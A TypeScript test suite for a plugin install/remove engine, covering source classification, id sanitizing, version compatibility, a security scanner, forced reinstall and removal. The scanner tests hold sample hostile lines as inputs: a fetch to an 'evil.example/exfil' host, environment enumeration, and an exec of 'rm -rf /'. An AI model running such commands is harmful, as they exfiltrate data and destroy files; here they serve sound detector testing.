/**
 * Install / remove engine tests (plugin SDK Step 6).
 *
 * Everything here is hermetic: each test builds a throwaway "source" module in a
 * tempdir and installs it into a SEPARATE tempdir extensions dir. No network, no
 * real npm/git, and never the real `~/.brigade` / `~/.pi`. The npm + git source
 * forms are exercised only at the CLASSIFY level (no fetch is performed) — the
 * actual byte-staging is unit-tested through the LOCAL path. Temp dirs are torn
 * down in `finally`.
 */

import { strict as assert } from "node:assert";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, it } from "node:test";

import {
	checkCompat,
	classifySource,
	installExtension,
	InstallError,
	listInstalledIds,
	removeExtension,
	resolveModuleId,
	sanitizeId,
} from "./install.js";
import { scanInstalledModule, scanSourceText, summarizeScan } from "./install-scan.js";
import type { BrigadeModuleManifest } from "./types.js";

const SAFE_MODULE_SRC = `export default { id: "demo", register(b) {} };\n`;

/** Make a fresh tempdir; caller cleans it up. */
function mkTemp(prefix: string): string {
	return mkdtempSync(join(tmpdir(), `brigade-${prefix}-`));
}

/** Build a local source folder with an index + optional manifest/package.json. */
function makeSourceDir(opts: {
	indexSrc?: string;
	manifest?: Partial<BrigadeModuleManifest>;
	packageName?: string;
}): string {
	const dir = mkTemp("ext-src");
	writeFileSync(join(dir, "index.ts"), opts.indexSrc ?? SAFE_MODULE_SRC);
	if (opts.manifest) {
		writeFileSync(join(dir, "brigade.extension.json"), JSON.stringify({ id: "demo", ...opts.manifest }, null, 2));
	}
	if (opts.packageName) {
		writeFileSync(join(dir, "package.json"), JSON.stringify({ name: opts.packageName, version: "1.0.0" }, null, 2));
	}
	return dir;
}

describe("classifySource", () => {
	it("classifies an existing on-disk path as local", () => {
		const dir = makeSourceDir({});
		try {
			assert.equal(classifySource(dir), "local");
		} finally {
			rmSync(dir, { recursive: true, force: true });
		}
	});

	it("classifies a relative/absolute path marker as local even if absent", () => {
		assert.equal(classifySource("./does-not-exist"), "local");
		assert.equal(classifySource("../nope"), "local");
	});

	it("classifies git URLs as git", () => {
		assert.equal(classifySource("https://github.com/acme/plugin.git"), "git");
		assert.equal(classifySource("git@github.com:acme/plugin.git"), "git");
		assert.equal(classifySource("git+https://example.com/x.git"), "git");
		assert.equal(classifySource("https://github.com/acme/plugin"), "git");
	});

	it("classifies a bare package spec as npm", () => {
		assert.equal(classifySource("brigade-plugin-weather"), "npm");
		assert.equal(classifySource("brigade-plugin-weather@1.2.0"), "npm");
		assert.equal(classifySource("@acme/brigade-plugin@2.0.0"), "npm");
	});

	it("rejects an empty source", () => {
		assert.throws(() => classifySource("   "), InstallError);
	});
});

describe("sanitizeId / resolveModuleId", () => {
	it("sanitizes arbitrary strings into safe folder ids", () => {
		assert.equal(sanitizeId("My Cool Plugin!"), "my-cool-plugin");
		assert.equal(sanitizeId("@acme/Weather"), "acme-weather");
		assert.equal(sanitizeId("--leading--"), "leading");
	});

	it("prefers the manifest id, then package name, then fallback", () => {
		const withManifest = makeSourceDir({ manifest: { id: "from-manifest" } });
		const withPkg = makeSourceDir({ packageName: "@scope/from-package" });
		const bare = makeSourceDir({});
		try {
			assert.equal(resolveModuleId(withManifest, "fallback"), "from-manifest");
			assert.equal(resolveModuleId(withPkg, "fallback"), "from-package");
			assert.equal(resolveModuleId(bare, "fallback-name"), "fallback-name");
		} finally {
			for (const d of [withManifest, withPkg, bare]) rmSync(d, { recursive: true, force: true });
		}
	});
});

describe("checkCompat", () => {
	it("is compatible when the manifest declares nothing", () => {
		const v = checkCompat(undefined, "0.1.0");
		assert.equal(v.compatible, true);
	});

	it("accepts a minBrigadeVersion at or below the running version", () => {
		assert.equal(checkCompat({ id: "x", minBrigadeVersion: "0.1.0" }, "0.1.0").compatible, true);
		assert.equal(checkCompat({ id: "x", minBrigadeVersion: "0.0.9" }, "0.1.0").compatible, true);
	});

	it("refuses a module that needs a newer Brigade", () => {
		const v = checkCompat({ id: "x", minBrigadeVersion: "0.2.0" }, "0.1.0");
		assert.equal(v.compatible, false);
		assert.match(v.reason, /needs Brigade 0\.2\.0/);
	});

	it("accepts an older / equal plugin-API generation, refuses a newer one", () => {
		assert.equal(checkCompat({ id: "x", pluginApi: "1" }, "0.1.0", 1).compatible, true);
		assert.equal(checkCompat({ id: "x", pluginApi: "0" }, "0.1.0", 1).compatible, true);
		const v = checkCompat({ id: "x", pluginApi: "2" }, "0.1.0", 1);
		assert.equal(v.compatible, false);
		assert.match(v.reason, /plugin API v2/);
	});
});

describe("security scanner", () => {
	it("flags risky constructs with severity + file + line", () => {
		const risky = [
			`const cp = require("child_process");`,
			`eval(userInput);`,
			`const r = new Function("return 1");`,
			`await fetch("https://evil.example/exfil");`,
			`writeFileSync("/tmp/x", data);`,
			`const all = { ...process.env };`,
		].join("\n");
		const findings = scanSourceText(risky, "index.ts");
		const rules = new Set(findings.map((f) => f.rule));
		assert.ok(rules.has("child-process"), "expected child-process");
		assert.ok(rules.has("dynamic-eval"), "expected dynamic-eval");
		assert.ok(rules.has("function-constructor"), "expected function-constructor");
		assert.ok(rules.has("http-client"), "expected http-client");
		assert.ok(rules.has("filesystem-write"), "expected filesystem-write");
		assert.ok(rules.has("env-enumeration"), "expected env-enumeration");
		// Each finding carries a 1-based line + file label.
		for (const f of findings) {
			assert.equal(f.file, "index.ts");
			assert.ok(f.line >= 1);
			assert.ok(f.snippet.length > 0);
		}
		assert.ok(findings.some((f) => f.severity === "high"));
	});

	it("returns no findings for clean source", () => {
		const clean = `export default { id: "ok", register(b) { b.tool({ name: "noop" }); } };`;
		const findings = scanSourceText(clean, "index.ts");
		assert.equal(findings.length, 0);
	});

	it("ignores whole-line comments (no false positive on a documented rule name)", () => {
		const commented = `// this module never calls eval( or child_process directly\nconst x = 1;`;
		const findings = scanSourceText(commented, "index.ts");
		assert.equal(findings.length, 0);
	});

	it("scans a directory tree and summarizes counts", () => {
		const dir = mkTemp("scan");
		try {
			writeFileSync(join(dir, "index.ts"), `eval(x);\n`);
			mkdirSync(join(dir, "node_modules", "dep"), { recursive: true });
			writeFileSync(join(dir, "node_modules", "dep", "evil.js"), `child_process.exec("rm -rf /");\n`);
			const report = scanInstalledModule(dir);
			// node_modules is skipped → only the author's eval is found.
			assert.equal(report.findings.length, 1);
			assert.equal(report.counts.high, 1);
			assert.match(summarizeScan(report), /1 high/);
		} finally {
			rmSync(dir, { recursive: true, force: true });
		}
	});
});

describe("installExtension (local path)", () => {
	it("installs a folder source, resolves the manifest id, runs scan + compat", async () => {
		const src = makeSourceDir({ manifest: { id: "weather", minBrigadeVersion: "0.0.1" } });
		const extDir = mkTemp("ext-dir");
		try {
			const result = await installExtension(src, { extensionsDir: extDir, brigadeVersionOverride: "0.1.0" });
			assert.equal(result.id, "weather");
			assert.equal(result.sourceKind, "local");
			assert.equal(result.compat.compatible, true);
			assert.equal(result.scan.findings.length, 0);
			assert.ok(existsSync(join(extDir, "weather", "index.ts")));
			assert.deepEqual(listInstalledIds(extDir), ["weather"]);
		} finally {
			rmSync(src, { recursive: true, force: true });
			rmSync(extDir, { recursive: true, force: true });
		}
	});

	it("installs a single FILE source as index.<ext>", async () => {
		const srcDir = mkTemp("ext-file-src");
		const file = join(srcDir, "my-mod.mjs");
		writeFileSync(file, SAFE_MODULE_SRC);
		const extDir = mkTemp("ext-dir");
		try {
			const result = await installExtension(file, { extensionsDir: extDir, brigadeVersionOverride: "0.1.0" });
			assert.equal(result.id, "my-mod");
			assert.ok(existsSync(join(extDir, "my-mod", "index.mjs")));
		} finally {
			rmSync(srcDir, { recursive: true, force: true });
			rmSync(extDir, { recursive: true, force: true });
		}
	});

	it("surfaces scan findings without blocking the install", async () => {
		const src = makeSourceDir({ indexSrc: `child_process.exec("ls");\nexport default { id: "risky", register() {} };` });
		const extDir = mkTemp("ext-dir");
		try {
			const result = await installExtension(src, { extensionsDir: extDir, brigadeVersionOverride: "0.1.0" });
			assert.ok(result.scan.findings.length >= 1);
			assert.ok(result.scan.counts.high >= 1);
			// Install still landed on disk — the scan is advisory, not a block.
			assert.ok(existsSync(result.dir));
		} finally {
			rmSync(src, { recursive: true, force: true });
			rmSync(extDir, { recursive: true, force: true });
		}
	});

	it("refuses a forward-incompatible module and rolls the files back", async () => {
		const src = makeSourceDir({ manifest: { id: "futuristic", minBrigadeVersion: "9.9.9" } });
		const extDir = mkTemp("ext-dir");
		try {
			await assert.rejects(
				() => installExtension(src, { extensionsDir: extDir, brigadeVersionOverride: "0.1.0" }),
				(err: unknown) => err instanceof InstallError && /needs Brigade 9\.9\.9/.test((err as Error).message),
			);
			// Rolled back — nothing left behind.
			assert.equal(existsSync(join(extDir, "futuristic")), false);
		} finally {
			rmSync(src, { recursive: true, force: true });
			rmSync(extDir, { recursive: true, force: true });
		}
	});
});

describe("id collision + --force", () => {
	it("refuses a second install of the same id without --force", async () => {
		const src = makeSourceDir({ manifest: { id: "dup" } });
		const extDir = mkTemp("ext-dir");
		try {
			await installExtension(src, { extensionsDir: extDir, brigadeVersionOverride: "0.1.0" });
			await assert.rejects(
				() => installExtension(src, { extensionsDir: extDir, brigadeVersionOverride: "0.1.0" }),
				(err: unknown) => err instanceof InstallError && /already installed/.test((err as Error).message),
			);
		} finally {
			rmSync(src, { recursive: true, force: true });
			rmSync(extDir, { recursive: true, force: true });
		}
	});

	it("replaces an existing id with --force", async () => {
		const src1 = makeSourceDir({ manifest: { id: "dup" }, indexSrc: `export default { id:"dup", register(){} }; // v1` });
		const src2 = makeSourceDir({ manifest: { id: "dup" }, indexSrc: `export default { id:"dup", register(){} }; // v2` });
		const extDir = mkTemp("ext-dir");
		try {
			await installExtension(src1, { extensionsDir: extDir, brigadeVersionOverride: "0.1.0" });
			const result = await installExtension(src2, {
				extensionsDir: extDir,
				force: true,
				brigadeVersionOverride: "0.1.0",
			});
			assert.equal(result.replacedExisting, true);
			const landed = readFileSync(join(extDir, "dup", "index.ts"), "utf8");
			assert.match(landed, /v2/);
		} finally {
			for (const d of [src1, src2, extDir]) rmSync(d, { recursive: true, force: true });
		}
	});
});

describe("removeExtension", () => {
	it("removes an installed extension by id", async () => {
		const src = makeSourceDir({ manifest: { id: "goner" } });
		const extDir = mkTemp("ext-dir");
		try {
			await installExtension(src, { extensionsDir: extDir, brigadeVersionOverride: "0.1.0" });
			assert.ok(existsSync(join(extDir, "goner")));
			const removed = removeExtension("goner", extDir);
			assert.equal(removed.id, "goner");
			assert.equal(existsSync(join(extDir, "goner")), false);
		} finally {
			rmSync(src, { recursive: true, force: true });
			rmSync(extDir, { recursive: true, force: true });
		}
	});

	it("sanitizes the id so `Goner` matches the `goner` folder", async () => {
		const src = makeSourceDir({ manifest: { id: "goner" } });
		const extDir = mkTemp("ext-dir");
		try {
			await installExtension(src, { extensionsDir: extDir, brigadeVersionOverride: "0.1.0" });
			const removed = removeExtension("Goner", extDir);
			assert.equal(removed.id, "goner");
		} finally {
			rmSync(src, { recursive: true, force: true });
			rmSync(extDir, { recursive: true, force: true });
		}
	});

	it("refuses cleanly when the extension is absent", () => {
		const extDir = mkTemp("ext-dir");
		try {
			assert.throws(
				() => removeExtension("nope", extDir),
				(err: unknown) => err instanceof InstallError && /No extension named/.test((err as Error).message),
			);
		} finally {
			rmSync(extDir, { recursive: true, force: true });
		}
	});
});
